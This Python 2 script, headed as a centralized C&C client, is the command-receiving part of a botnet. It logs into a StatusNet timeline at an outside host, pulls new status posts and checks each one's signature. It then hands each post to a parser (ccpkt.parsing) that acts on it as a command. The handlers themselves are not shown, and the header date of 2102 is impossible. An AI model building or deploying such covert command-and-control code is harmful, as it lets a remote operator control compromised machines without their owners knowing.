#!/usr/bin/env python
#
# Centrialized C&C: Synchronized with Centralized Server
#
# Date: Oct. 26, 2102
# All rights reserved.
#

import urllib2,ccpkt
import xml.etree.ElementTree as ET
import cmd

status_url="https://abc-edu.status.net"
status_page="/api/statuses/friends_timeline/abc.xml"
username=''
password=''

old_id=0

def synchronize():
	global old_id
	cur_id=old_id
	try:
		passwd_mgr=urllib2.HTTPPasswordMgrWithDefaultRealm()
		passwd_mgr.add_password(None, status_url, username, password) 
		handler=urllib2.HTTPBasicAuthHandler(passwd_mgr)
		opener=urllib2.build_opener(handler)
		urllib2.install_opener(opener)
		a_url = status_url + status_page + "?since_id=" + str(old_id)
		f=opener.open(a_url)
		urllib2.install_opener(opener)
		xml = f.read()
		#print xml
		root = ET.fromstring(xml)
		for child in root.findall('status'):
			try:
				data = child.find('text').text
				time = child.find('created_at').text
				idx = child.find('id').text
			except:
				print "Invalid Status"
				break
			sid = int(idx)
			print "sid: %d, cur: %d, old: %d" % (sid, cur_id, old_id)
			if sid > old_id:  # new command found
				if sid > cur_id:
					cur_id = sid
				pkt = cmd.verify_msg(data, "keys/mrpub.pem")
				ccpkt.parsing(pkt)
		old_id = cur_id
	except Exception as inst:
		print type(inst)
		print inst

if __name__ == "__main__":
	synchronize()

